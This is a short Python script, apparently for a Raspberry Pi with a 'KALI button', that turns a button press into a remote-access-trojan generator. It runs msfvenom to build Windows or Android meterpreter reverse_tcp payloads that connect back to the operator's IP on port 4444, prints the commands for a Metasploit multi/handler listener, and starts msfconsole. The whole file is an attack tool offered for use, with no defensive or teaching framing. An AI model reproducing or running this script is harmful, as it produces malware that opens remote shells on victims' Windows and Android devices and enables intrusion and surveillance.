import RPi.GPIO as GPIO
import os
from time import sleep

GPIO.setmode(GPIO.BCM)
GPIO.setup(15, GPIO.IN, pull_up_down=GPIO.PUD_UP)

print('Press the KALI button to execute the app')

while 1==1:
    if GPIO.input(15) == 0:

        while 1==1:
            pl = input("Are you attacking Windows or Android: ")
            if pl == "android":
                o = "android"
                break
            elif pl == "windows":
                o = "windows"
                break
            else:
                print("OS " + pl + " is not surpported (make sure their is no capital letter)")

        os.system("ifconfig")

        ip = input("What is the IP of you KALI device: ")
        d = input("Where do you want to store the RAT: ")
        n = input("Give the file a name: ")

        if o == "android":
            os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " R > " + d + "/" + n)
        elif o == "windows":
            os.system("msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=" + ip +" LPORT=4444 -o " + d + "/" + n)
        print("The RAT is store in " + d + "/" + n)

        print("+------------------------------------------------------+") #54 chars
        print("|                       COMMANDS                       |")
        print("+------------------------------------------------------+")
        print("|                  Setup the listener                  |")
        print("| > use exploit/multi/handler                          |")
        print("| > set payload " + o + "/meterpreter/reverse_tcp        |")
        print("| > set LHOST <Device IP>                              |")
        print("+------------------------------------------------------+")
        print("|                  Start the listener                  |")
        print("+------------------------------------------------------+")
        print("| > exploit                                            |")
        print("+------------------------------------------------------+")

        os.system('sh -c "service postgresql start && msfdb init && msfconsole;${SHELL:-bash}"')
        break
